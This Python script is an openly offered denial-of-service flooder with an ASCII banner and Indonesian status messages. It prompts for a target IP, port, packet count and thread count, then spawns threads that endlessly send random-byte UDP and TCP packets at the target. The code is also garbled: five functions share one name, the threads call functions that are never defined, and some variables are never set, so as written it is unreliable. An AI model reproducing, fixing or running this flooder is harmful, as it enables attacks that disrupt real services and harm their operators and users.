#!/usr/bin/env python
#By AxeL
import os
import threading
import sys
import struct
import random
import time
import socket

os.system("clear")
print("""
\033[91m
 
██████╗░░█████╗░░█████╗░██╗░░██╗██╗░░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝╚██╗░██╔╝
██████╔╝██║░░██║██║░░╚═╝█████═╝░░╚████╔╝░
██╔══██╗██║░░██║██║░░██╗██╔═██╗░░░╚██╔╝░░
██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗░░░██║░░░
╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░
""")
choice = str(input("\033[96m=====> Enter The Start Attack starting packet goto target (Attack/n) : "))
ip = str(input("\033[66m=====> Enter the ip/host target    : "))
port = int(input("\033[55m=====> Enter The Port Target  : "))
times = int(input("\033[44m=====> Enter The Packets : "))
threads = int(input("\033[33]=====>  Enter The Threada : "))
def Attack():
	K_bytes = random._urandom(577)
	K_bytes = random._urandom(578)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(K_bytes,addr)
			print(x +"\033[59mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_bytes = random._urandom(1025)
	K_bytes = random._urandom(1026)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(K_bytes)
			for x in range(times):
				s.send(K_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			s.close()
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_bytes = random._urandom(1090)
	I_bytes = random._urandom(1090)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(K_bytes)
			for x in range(times):
				s.send(K_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			s.close()
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_bytes = random._urandom(577)
	K_bytes = random._urandom(578)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(K_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_K_bytes = random._urandom(222)
	L_K_bytes = random._urandom(222)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(K_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

for y in range(threads):

	if choice == 'Attack':

		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
	else:
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
